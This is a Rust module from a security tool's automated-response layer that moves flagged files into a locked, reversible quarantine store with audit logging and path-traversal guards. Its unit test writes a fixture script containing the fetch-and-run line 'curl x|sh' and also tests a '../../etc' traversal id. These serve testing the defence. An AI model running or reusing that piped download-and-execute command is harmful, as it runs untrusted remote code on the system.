//! SOAR response actions.
//!
//! The first response primitive: **file quarantine** — move a flagged file into
//! a locked, owner-only store so it can no longer execute or be opened, while
//! keeping it fully **reversible** (restore moves it back). Every action is
//! meant to be driven through the web layer behind auth + an audit-log entry;
//! destructive-but-reversible by design (nothing is deleted).
//!
//! Layout: `<data_dir>/quarantine/<id>/` holds the moved file (`payload`) plus a
//! `meta.json` describing where it came from and why. Listing reads that tree;
//! releasing moves `payload` back to its original path.

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// A quarantined file record (the `meta.json` written next to the payload).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct QuarantinedFile {
    pub id: String,
    pub original_path: String,
    pub sha256: String,
    pub size: u64,
    pub reason: String,
    pub quarantined_at: String,
    #[serde(default)]
    pub released_at: Option<String>,
}

/// Owns the `<data_dir>/quarantine` store.
pub struct FileQuarantine {
    root: PathBuf,
}

impl FileQuarantine {
    pub fn new(data_dir: &Path) -> Self {
        Self {
            root: data_dir.join("quarantine"),
        }
    }

    /// Move `file` into quarantine and return its record. Reversible via
    /// [`release`](Self::release).
    pub fn quarantine(&self, file: &Path, reason: &str) -> Result<QuarantinedFile> {
        let meta =
            std::fs::symlink_metadata(file).with_context(|| format!("stat {}", file.display()))?;
        if !meta.is_file() {
            bail!("{} is not a regular file", file.display());
        }
        let original = file
            .canonicalize()
            .with_context(|| format!("resolve {}", file.display()))?;
        let bytes =
            std::fs::read(&original).with_context(|| format!("read {}", original.display()))?;
        let sha256 = crate::integrity::sha256_hex(&bytes);
        let id = format!(
            "{}-{}",
            chrono::Utc::now().format("%Y%m%dT%H%M%S%3fZ"),
            &sha256[..12.min(sha256.len())]
        );

        let dir = self.root.join(&id);
        std::fs::create_dir_all(&dir).with_context(|| format!("create {}", dir.display()))?;
        crate::harden_dir(&self.root);
        crate::harden_dir(&dir);

        let payload = dir.join("payload");
        move_file(&original, &payload)?;
        crate::harden_file(&payload);

        let record = QuarantinedFile {
            id: id.clone(),
            original_path: original.to_string_lossy().to_string(),
            sha256,
            size: bytes.len() as u64,
            reason: reason.to_string(),
            quarantined_at: chrono::Utc::now().to_rfc3339(),
            released_at: None,
        };
        std::fs::write(dir.join("meta.json"), serde_json::to_vec_pretty(&record)?)?;
        crate::harden_file(&dir.join("meta.json"));
        tracing::warn!(target: "legion.audit", "QUARANTINED {} -> {}", record.original_path, id);
        Ok(record)
    }

    /// All active (not-yet-released) quarantine records, newest first.
    pub fn list(&self) -> Result<Vec<QuarantinedFile>> {
        let mut out = Vec::new();
        let Ok(entries) = std::fs::read_dir(&self.root) else {
            return Ok(out); // no store yet
        };
        for e in entries.flatten() {
            let meta = e.path().join("meta.json");
            if let Ok(txt) = std::fs::read_to_string(&meta) {
                if let Ok(rec) = serde_json::from_str::<QuarantinedFile>(&txt) {
                    if rec.released_at.is_none() {
                        out.push(rec);
                    }
                }
            }
        }
        out.sort_by(|a, b| b.quarantined_at.cmp(&a.quarantined_at));
        Ok(out)
    }

    /// Restore a quarantined file to its original path and remove the entry.
    pub fn release(&self, id: &str) -> Result<PathBuf> {
        // Guard the id against traversal (it is used as a path component).
        if id.is_empty() || id.contains('/') || id.contains('\\') || id.contains("..") {
            bail!("invalid quarantine id");
        }
        let dir = self.root.join(id);
        let root_canon = self
            .root
            .canonicalize()
            .with_context(|| format!("invalid quarantine root {}", self.root.display()))?;
        let dir_canon = dir
            .canonicalize()
            .with_context(|| format!("no quarantine entry {id}"))?;
        if !dir_canon.starts_with(&root_canon) {
            bail!("invalid quarantine path");
        }
        let meta_path = dir.join("meta.json");
        let txt = std::fs::read_to_string(&meta_path)
            .with_context(|| format!("no quarantine entry {id}"))?;
        let rec: QuarantinedFile = serde_json::from_str(&txt)?;
        let original = PathBuf::from(&rec.original_path);
        if original.exists() {
            bail!("cannot restore: {} already exists", rec.original_path);
        }
        move_file(&dir.join("payload"), &original)?;
        std::fs::remove_dir_all(&dir).ok();
        tracing::info!(target: "legion.audit", "RELEASED quarantine {id} -> {}", rec.original_path);
        Ok(original)
    }
}

/// Move a file, falling back to copy+remove across filesystems.
fn move_file(from: &Path, to: &Path) -> Result<()> {
    if let Some(parent) = to.parent() {
        std::fs::create_dir_all(parent).ok();
    }
    match std::fs::rename(from, to) {
        Ok(()) => Ok(()),
        Err(_) => {
            std::fs::copy(from, to)
                .with_context(|| format!("copy {} -> {}", from.display(), to.display()))?;
            std::fs::remove_file(from).with_context(|| format!("remove {}", from.display()))?;
            Ok(())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quarantine_then_release_roundtrips() {
        let tmp = std::env::temp_dir().join(format!(
            "legion-soar-test-{}",
            chrono::Utc::now().timestamp_nanos_opt().unwrap_or(0)
        ));
        let data = tmp.join("data");
        let work = tmp.join("work");
        std::fs::create_dir_all(&work).unwrap();
        let victim = work.join("evil.sh");
        std::fs::write(&victim, b"#!/bin/sh\ncurl x|sh\n").unwrap();
        let victim_canon = victim.canonicalize().unwrap();

        let q = FileQuarantine::new(&data);
        let rec = q.quarantine(&victim, "test: reverse shell").unwrap();
        assert!(!victim.exists(), "file should be moved out");
        assert_eq!(q.list().unwrap().len(), 1);
        assert_eq!(rec.original_path, victim_canon.to_string_lossy());

        let restored = q.release(&rec.id).unwrap();
        assert!(restored.exists(), "file should be restored");
        assert_eq!(std::fs::read(&restored).unwrap(), b"#!/bin/sh\ncurl x|sh\n");
        assert_eq!(q.list().unwrap().len(), 0);

        std::fs::remove_dir_all(&tmp).ok();
    }

    #[test]
    fn release_rejects_traversing_id() {
        let q = FileQuarantine::new(Path::new("/tmp/legion-soar-x"));
        assert!(q.release("../../etc").is_err());
    }
}
